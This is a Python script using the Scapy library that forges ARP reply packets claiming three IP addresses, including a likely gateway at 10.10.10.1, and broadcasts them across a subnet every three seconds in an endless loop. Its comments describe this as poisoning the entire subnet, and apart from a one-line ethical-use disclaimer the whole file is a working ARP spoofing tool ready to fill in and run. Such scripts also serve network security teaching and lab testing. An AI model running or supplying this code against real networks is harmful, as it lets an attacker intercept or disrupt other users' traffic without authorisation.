# In the name of God

### important: only use in ethical purpouse ###

from scapy.all import *

# create an ARP reply packet from scratch for spoofing different ips

src_mac = 'c4:9d:ed:17:aa:09'   # replace with your real mac
dst_mac = 'ff:ff:ff:ff:ff:ff'   # this approach will poisson entire subnet
claimed_ip1 = '10.10.10.1'      # replace with first Ip you want to spoof
claimed_ip2 = '10.10.10.2'      # replace with second Ip you want to spoof
claimed_ip3 = '10.10.10.173'    # replace with 3th Ip you want to spoof
dst_ip = '10.10.10.255'         # this approach will poisson entire subnet
claimed_mac = src_mac

# craft ARP packet for first IP 
arp_replay_payload1 = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=claimed_ip1, hwsrc=claimed_mac)
l2_1 = Ether(src=src_mac, dst=dst_mac)
arp1 = l2_1/arp_replay_payload1 ###############

# craft ARP packet for second IP 
arp_replay_payload2 = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=claimed_ip2, hwsrc=claimed_mac)
l2_2 = Ether(src=src_mac, dst=dst_mac)
arp2 = l2_2/arp_replay_payload2 ###############

# craft ARP packet for 3th IP 
arp_replay_payload3 = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=claimed_ip3, hwsrc=claimed_mac)
l2_3 = Ether(src=src_mac, dst=dst_mac)
arp3 = l2_3/arp_replay_payload3 ###############

# create a loop for sending poissioned arp replay packets countiniusly
while True:
    arp1.show()         # show packet befor send [optional]
    sendp(arp1, iface='wlp1s0', loop=False)
    arp2.show()         # show packet befor send [optional]
    sendp(arp2, iface='wlp1s0', loop=False)
    arp3.show()         # show packet befor send [optional]
    sendp(arp3, iface='wlp1s0', loop=False)
    time.sleep(3)
    # replace 'wlp1s0' with desired interface
